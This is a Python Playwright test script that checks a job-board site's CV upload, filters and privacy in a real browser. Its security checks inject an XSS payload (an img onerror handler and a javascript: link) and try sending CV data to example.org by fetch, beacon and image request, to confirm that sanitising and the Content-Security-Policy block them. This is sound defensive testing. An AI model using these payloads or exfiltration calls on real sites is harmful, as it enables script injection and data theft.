"""csa_browser_check.py -- JB-17: the browser half of the CSA pass (docs/quality/CSA_Testing.md).

  cd engine && python build_board.py --demo && cd ..
  python tools/csa_browser_check.py            # exit 0 = every check passed

Needs Playwright (`pip install playwright`) and Microsoft Edge (channel="msedge"; no browser
download). Serves site/ on a random local port and checks, in a real browser:
  TC-3   .docx and .pdf CV upload -> text extracted into #cvText
  TC-6   no profile -> the board still shows roles (never blank)
  TC-7   Min score 8+ -> only roles scoring >= 8
  TC-8   Work arrangement = Remote -> only remote roles
  TC-9   JD gap with a CV loaded -> CV skills under "have", the rest under "gaps"
  TC-10  CV text never leaves the browser (unique marker in 0 requests, 0 non-GET requests)
  SEC    job text renders as text (<img onerror> creates nothing; javascript: links dropped)
  SRI    all CDN libraries load with their integrity hashes; 0 page errors
  CSP    the page's Content-Security-Policy is present, nothing it blocks is needed (0 violations),
         and it really blocks fetch / sendBeacon / <img> to a foreign host
"""
from __future__ import annotations

import http.server
import os
import socketserver
import sys
import tempfile
import threading
import zipfile
from functools import partial

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..")
MARK = "ZQXCVMARKER7781"
CV = ["Jordan Sample " + MARK, "Embedded Firmware Engineer, London ON",
      "Skills: C, C++, ARM Cortex-M, FreeRTOS, Altium, PCB design, SPI, I2C, Python",
      "IEC 60601 medical device firmware; ISO 13485 design controls."]


def _docx(path):
    paras = "".join(f"<w:p><w:r><w:t>{line}</w:t></w:r></w:p>" for line in CV)
    with zipfile.ZipFile(path, "w") as z:
        z.writestr("[Content_Types].xml", '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
        z.writestr("_rels/.rels", '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>')
        z.writestr("word/document.xml", f'<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>{paras}</w:body></w:document>')


def main() -> int:
    from playwright.sync_api import sync_playwright
    if not os.path.exists(os.path.join(ROOT, "site", "data", "jobs_matches.json")):
        print("site/data is empty: run `cd engine && python build_board.py --demo` first")
        return 2
    handler = partial(http.server.SimpleHTTPRequestHandler, directory=os.path.join(ROOT, "site"))
    handler.log_message = lambda *a, **k: None
    srv = socketserver.TCPServer(("127.0.0.1", 0), handler)
    url = f"http://127.0.0.1:{srv.server_address[1]}/index.html"
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    tmp = tempfile.mkdtemp(prefix="csa_")
    results, errors, reqs, csp = [], [], [], []

    def check(name, ok, detail=""):
        results.append((name, bool(ok), detail))

    with sync_playwright() as p:
        b = p.chromium.launch(channel="msedge", headless=True)
        pg0 = b.new_page()
        pg0.set_content("<html><body>" + "".join(f"<p>{x}</p>" for x in CV) + "</body></html>")
        pdf = os.path.join(tmp, "cv.pdf")
        pg0.pdf(path=pdf)
        pg0.close()
        docx = os.path.join(tmp, "cv.docx")
        _docx(docx)

        def page():
            pg = b.new_context(viewport={"width": 1280, "height": 900}).new_page()
            pg.on("pageerror", lambda e: errors.append(str(e)))
            pg.on("console", lambda m: csp.append(m.text) if "Content Security Policy" in m.text else None)
            pg.on("request", lambda r: reqs.append((r.method, r.url, r.post_data or "")))
            pg.goto(url)
            pg.wait_for_timeout(2500)
            return pg

        for kind, path in (("docx", docx), ("pdf", pdf)):
            pg = page()
            pg.evaluate("showTab('profile')")
            pg.set_input_files("#cvFile", path)
            pg.wait_for_timeout(3500)
            check(f"TC-3 {kind} upload", "FreeRTOS" in pg.evaluate("document.querySelector('#cvText').value"))
            pg.context.close()

        pg = page()
        libs = pg.evaluate("""() => [typeof window.L, typeof (window.L && L.markerClusterGroup), typeof window.mammoth,
                                     typeof window.pdfjsLib]""")
        check("SRI libraries load", libs == ["object", "function", "object", "object"], str(libs))
        cards = lambda: pg.evaluate("[...document.querySelectorAll('#listView .job')].map(j=>({s:+j.querySelector('.score b').textContent, a:(j.querySelector('.chip.arr')||{}).textContent||''}))")
        pg.evaluate("showTab('roles')")
        allc = cards()
        check("TC-6 board not blank without a profile", len(allc) > 0, f"{len(allc)} cards")
        pg.select_option("#minScore", "8")
        pg.wait_for_timeout(400)
        c8 = cards()
        check("TC-7 min score 8+", c8 and min(x["s"] for x in c8) >= 8 and len(c8) <= len(allc), f"{len(allc)} -> {len(c8)}")
        pg.select_option("#minScore", "0")
        pg.select_option("#arrangement", "remote")
        pg.wait_for_timeout(400)
        cr = cards()
        check("TC-8 remote filter", all(x["a"] == "Remote" for x in cr), f"{len(cr)} shown")
        pg.select_option("#arrangement", "")
        n_before = len(reqs)
        pg.evaluate("showTab('profile')")
        pg.fill("#cvText", "\n".join(CV))
        pg.click("#analyzeBtn")
        pg.wait_for_timeout(1200)
        save = pg.locator("button", has_text="Save and re-rank")
        if save.count():
            save.first.click()
            pg.wait_for_timeout(1200)
        pg.evaluate("showTab('roles')")
        pg.evaluate("document.querySelector('#jdIn').value='Must have C++, FreeRTOS, Kubernetes and Rust. IEC 60601 a plus.'")
        pg.evaluate("document.querySelector('#jdBtn').click()")
        pg.wait_for_timeout(500)
        gap = pg.evaluate("document.querySelector('#jdOut').textContent").lower()
        have, gaps = (gap.split("gaps to address") + [""])[:2]
        check("TC-9 JD gap", "freertos" in have and "kubernetes" in gaps and "rust" in gaps, gap[:120].replace("\n", " "))
        after = reqs[n_before:]
        leaks = [r for r in reqs if MARK in r[1] or MARK in r[2]]
        check("TC-10 CV never leaves the browser", not leaks and not any(m != "GET" for m, _, _ in reqs),
              f"{len(reqs)} requests, {len(after)} after the CV, {len(leaks)} with the marker")
        inj = pg.evaluate("""() => { window.__pwned = 0; const evil = '<img src=x onerror="window.__pwned=1">';
            const box = document.createElement('div');
            box.innerHTML = jobCard({company: evil, title: evil, location: evil, url: 'javascript:window.__pwned=2',
              posted: '2026-01-01', score: 8, arrangement: 'onsite', industry: evil, salary: evil, country: evil,
              tokens: {skills: []}}, 'matches', 0);
            document.body.appendChild(box);
            return [box.querySelectorAll('img').length, !!box.querySelector('a[href^="javascript"]')]; }""")
        pg.wait_for_timeout(300)
        check("SEC job text renders as text", inj == [0, False] and pg.evaluate("window.__pwned") == 0, str(inj))
        pg.context.close()
        # CSP must BLOCK exfiltration to any other host (fetch / beacon / image), not just be present
        pg = b.new_context().new_page()
        reached = []
        pg.on("requestfinished", lambda r: reached.append(r.url) if "example.org" in r.url else None)
        pg.goto(url)
        pg.wait_for_timeout(1500)
        pg.evaluate("""async () => {
            try { await fetch('https://example.org/x?cv=1'); } catch (e) {}
            try { navigator.sendBeacon('https://example.org/b', 'cv'); } catch (e) {}
            await new Promise(r => { const i = new Image(); i.onload = i.onerror = () => r(); i.src = 'https://example.org/i.gif?cv=1'; }); }""")
        pg.wait_for_timeout(800)
        check("CSP blocks fetch/beacon/img to a foreign host", not reached, ", ".join(reached))
        pg.context.close()
        b.close()
    srv.shutdown()
    check("0 page errors", not errors, "; ".join(errors[:3]))
    check("CSP: 0 violations", not csp, "; ".join(c[:140] for c in csp[:3]))
    html = open(os.path.join(ROOT, "site", "index.html"), encoding="utf-8").read()
    check("CSP: connect-src limited to self + GoatCounter",
          "connect-src 'self' https://attsis.goatcounter.com;" in html)
    for name, ok, detail in results:
        print(("PASS " if ok else "FAIL ") + name + (f"  ({detail})" if detail else ""))
    bad = [r for r in results if not r[1]]
    print(f"\n{len(results) - len(bad)}/{len(results)} CSA browser checks passed")
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
